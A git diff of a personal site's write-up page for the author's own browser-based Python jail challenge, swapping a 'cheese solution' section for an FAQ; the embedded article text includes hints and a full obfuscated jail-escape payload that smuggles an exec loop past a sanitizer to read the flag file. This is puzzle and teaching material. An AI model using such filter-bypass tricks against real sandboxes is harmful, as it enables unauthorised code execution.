@@ -22,9 +22,7 @@ import Pilcrow from '@/components/pilcrow'
 import { Thm, Lemma, Proof, Defn, Example } from '@/components/math'
 
 
-export const metadata = {
-    title: 'Terminal | Tripos Guru',
-}
+export const metadata = {title:"Terminal"}
 
 export default function Terminal () {
     return (
@@ -191,7 +189,7 @@ export default function Terminal () {
                 
                     <li className="pt-1 font-bold"><Link href="#solution" className="tocentry text-link [@media(hover:hover)]:hover:underline">Solution</Link></li>
                 
-                    <li className="pt-1 font-bold"><Link href="#cheese-solution" className="tocentry text-link [@media(hover:hover)]:hover:underline">Cheese solution</Link></li>
+                    <li className="pt-1 font-bold"><Link href="#faqs" className="tocentry text-link [@media(hover:hover)]:hover:underline">FAQs</Link></li>
                 
             </ul>
         </div>
@@ -294,22 +292,27 @@ And the reduced version:
 
 </Spoiler>
 
-<div className="text-2xl font-bold group flex space-x-1 pt-6 pb-2 items-baseline"><h2 id="cheese-solution" className="scroll-m-[calc(2.25rem+2*1rem+0.5rem)] md:scroll-m-[0.5rem] text-articleh2">Cheese solution</h2><Pilcrow href="#cheese-solution" text="https://tripos.guru/writeups/terminal#cheese-solution"/></div>
+<div className="text-2xl font-bold group flex space-x-1 pt-6 pb-2 items-baseline"><h2 id="faqs" className="scroll-m-[calc(2.25rem+2*1rem+0.5rem)] md:scroll-m-[0.5rem] text-articleh2">FAQs</h2><Pilcrow href="#faqs" text="https://tripos.guru/writeups/terminal#faqs"/></div>
 
-<Spoiler>
-
-<p>The way I got python to run in the browser was with <DiscreetLink href='https://pyodide.org/en/stable/'>Pyodide</DiscreetLink> and a <DiscreetLink href='https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers'>web worker</DiscreetLink>.
-The python runs client-side i.e. this is all really a fake prison-break environment. In particular the flag file has to be generated somehow, so the flag is somewhere in the source.</p>
-
-<p><br/></p>
-
-<p>So I had to find somewhere to hide the loading of the flag so that it wasn't completely obvious. It's in the main thread so at least there are no revealing network requests (initially it was in <code>init.py</code>).</p>
-
-<p><br/></p>
-
-<p>It's base-64 encoded; look for it in F12 -&gt; Sources.</p>
-
-</Spoiler>
+<div className="flex flex-col divide-y divide-border-strong">
+    <details className="faq-question">
+        <summary>How did you get Python to run in the browser???</summary>
+        <div>
+            I talked to my comp-sci teacher who helps run this <DiscreetLink href='https://www.pythonsponge.com/'>educational tool</DiscreetLink> - and he told me about how they use <DiscreetLink href='https://pyodide.org/en/stable/'>Pyodide</DiscreetLink> and a <DiscreetLink href='https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers'>web worker</DiscreetLink>. So I implemented that.
+        </div>
+    </details>
+    <details className="faq-question">
+        <summary>This is all client-side, so shouldn't I be able to cheese the flag by just looking in F12?</summary>
+        <div className="space-y-2">
+            <p>
+                Indeed there used to be a cheese solution by just going into F12 and realising that <code>init.py</code> contained the flag (thanks @xp3dx) - but I moved it &gt;:)
+            </p>
+            <p>
+                I have no idea if the flag is still accessible like this because I don't know enough about Next.js, but I will tell you that in my Next.js app it's in <code>components/challenge.js</code> - feel free to try and hunt for it in whatever obsfucated garbage Next.js gives you...
+            </p>
+        </div>
+    </details>
+</div>
 
         </div>
 
@@ -328,7 +331,7 @@ The python runs client-side i.e. this is all really a fake prison-break environm
 
                 
                     <div className="">
-                        <CopyButton text="A writeup for the hangman challenge on my homepage. As far as I know it&#x27;s a completely original challenge; if anything I&#x27;m proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of quines. I used Pyodide to run python in the browser (pretty cool!), which I heard about from my teacher at school, who used it to make the (well-known?) Python Sponge. Hint 1 The hangman game really is unbeatable. The goal of the challenge is to take advantage of the name loading and use that to read the flag. Hint 2 Look at the name verification function. If we can write some python code that sanitizes to ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran game.py. So the goal is: write a python file that reads /flag.txt, whose alphanumeric characters in order are Erroryour.... Hint 3 Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful. We can have variables because underscores are allowed in python variable names. Also we have numbers, by doing something like: _ = &#x27;&#x27; &lt; &#x27;_&#x27; # one (compares ascii values) __ = _+_+_+_ # four ___ = __*__ # sixteen Solution What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative? For readability, I&#x27;ve named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a trick of encoding a utf-8 string in utf-16 to garble it. &#x27;Erroryo&#x27; U,R,N = &#x27;urn&#x27; &#x27;amedoesn&#x27; T,S = &#x27;ts&#x27; &#x27;eemtob&#x27; EVAL = eval STR = EVAL(S+T+R) I,D = &#x27;id&#x27; DIR = EVAL(D+I+R) &#x27;IllcallyouMrUn&#x27; ONE = &#x27;&#x27;&lt;&#x27;_&#x27; SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S FUNCS = DIR(EVAL(&#x27;__import__(&quot;&#x27;+BUILTINS+&#x27;&quot;)&#x27;)) &#x27;ant&#x27; EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE] BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE] # the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is: # while True: exec(input()); SHELLCODE = BYTES+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+U+STR(SEVEN+SEVEN+ONE+ONE)+&#x27;&quot;)[&#x27;+STR(ONE+ONE)+&#x27;:]&#x27; EVAL(EXEC+&#x27;(&#x27;+SHELLCODE+&#x27;)&#x27;) And the reduced version: &#x27;Erroryo&#x27;;________,_____,_________=&#x27;urn&#x27;;&#x27;amedoesn&#x27;;__________,______=&#x27;ts&#x27;;&#x27;eemtob&#x27;;___=eval;____,___________=&#x27;id&#x27;;&#x27;IllcallyouMrUn&#x27;;_=&#x27;&#x27;&lt;&#x27;_&#x27;;__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___(&#x27;__import__(&quot;&#x27;+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+&#x27;&quot;)&#x27;)))[-__*__-_-_]+&#x27;(&#x27;+____________[-__*__-__-__-_-_]+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+________+_______(__+__+_+_)+&#x27;&quot;)[&#x27;+_______(_+_)+&#x27;:]&#x27;+&#x27;)&#x27;);&#x27;ant&#x27; Cheese solution The way I got python to run in the browser was with Pyodide and a web worker. The python runs client-side i.e. this is all really a fake prison-break environment. In particular the flag file has to be generated somehow, so the flag is somewhere in the source. So I had to find somewhere to hide the loading of the flag so that it wasn&#x27;t completely obvious. It&#x27;s in the main thread so at least there are no revealing network requests (initially it was in init.py). It&#x27;s base-64 encoded; look for it in F12 -&gt; Sources.">Copy article plaintext</CopyButton>
+                        <CopyButton text="A writeup for the hangman challenge on my homepage. As far as I know it&#x27;s a completely original challenge; if anything I&#x27;m proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of quines. I used Pyodide to run python in the browser (pretty cool!), which I heard about from my teacher at school, who used it to make the (well-known?) Python Sponge. Hint 1 The hangman game really is unbeatable. The goal of the challenge is to take advantage of the name loading and use that to read the flag. Hint 2 Look at the name verification function. If we can write some python code that sanitizes to ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran game.py. So the goal is: write a python file that reads /flag.txt, whose alphanumeric characters in order are Erroryour.... Hint 3 Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful. We can have variables because underscores are allowed in python variable names. Also we have numbers, by doing something like: _ = &#x27;&#x27; &lt; &#x27;_&#x27; # one (compares ascii values) __ = _+_+_+_ # four ___ = __*__ # sixteen Solution What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative? For readability, I&#x27;ve named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a trick of encoding a utf-8 string in utf-16 to garble it. &#x27;Erroryo&#x27; U,R,N = &#x27;urn&#x27; &#x27;amedoesn&#x27; T,S = &#x27;ts&#x27; &#x27;eemtob&#x27; EVAL = eval STR = EVAL(S+T+R) I,D = &#x27;id&#x27; DIR = EVAL(D+I+R) &#x27;IllcallyouMrUn&#x27; ONE = &#x27;&#x27;&lt;&#x27;_&#x27; SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S FUNCS = DIR(EVAL(&#x27;__import__(&quot;&#x27;+BUILTINS+&#x27;&quot;)&#x27;)) &#x27;ant&#x27; EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE] BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE] # the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is: # while True: exec(input()); SHELLCODE = BYTES+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+U+STR(SEVEN+SEVEN+ONE+ONE)+&#x27;&quot;)[&#x27;+STR(ONE+ONE)+&#x27;:]&#x27; EVAL(EXEC+&#x27;(&#x27;+SHELLCODE+&#x27;)&#x27;) And the reduced version: &#x27;Erroryo&#x27;;________,_____,_________=&#x27;urn&#x27;;&#x27;amedoesn&#x27;;__________,______=&#x27;ts&#x27;;&#x27;eemtob&#x27;;___=eval;____,___________=&#x27;id&#x27;;&#x27;IllcallyouMrUn&#x27;;_=&#x27;&#x27;&lt;&#x27;_&#x27;;__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___(&#x27;__import__(&quot;&#x27;+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+&#x27;&quot;)&#x27;)))[-__*__-_-_]+&#x27;(&#x27;+____________[-__*__-__-__-_-_]+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+________+_______(__+__+_+_)+&#x27;&quot;)[&#x27;+_______(_+_)+&#x27;:]&#x27;+&#x27;)&#x27;);&#x27;ant&#x27; FAQs How did you get Python to run in the browser??? I talked to my comp-sci teacher who helps run this educational tool - and he told me about how they use Pyodide and a web worker. So I implemented that. This is all client-side, so shouldn&#x27;t I be able to cheese the flag by just looking in F12? Indeed there used to be a cheese solution by just going into F12 and realising that init.py contained the flag (thanks @xp3dx) - but I moved it &gt;:) I have no idea if the flag is still accessible like this because I don&#x27;t know enough about Next.js, but I will tell you that in my Next.js app it&#x27;s in components/challenge.js - feel free to try and hunt for it in whatever obsfucated garbage Next.js gives you...">Copy article plaintext</CopyButton>
                     </div>
                 
             </div>
@@ -350,7 +353,7 @@ The python runs client-side i.e. this is all really a fake prison-break environm
                     
                         <li className="pt-1 font-bold"><Link href="#solution" className="text-link [@media(hover:hover)]:hover:underline">Solution</Link></li>
                     
-                        <li className="pt-1 font-bold"><Link href="#cheese-solution" className="text-link [@media(hover:hover)]:hover:underline">Cheese solution</Link></li>
+                        <li className="pt-1 font-bold"><Link href="#faqs" className="text-link [@media(hover:hover)]:hover:underline">FAQs</Link></li>
                     
                 </ul>
             </div>
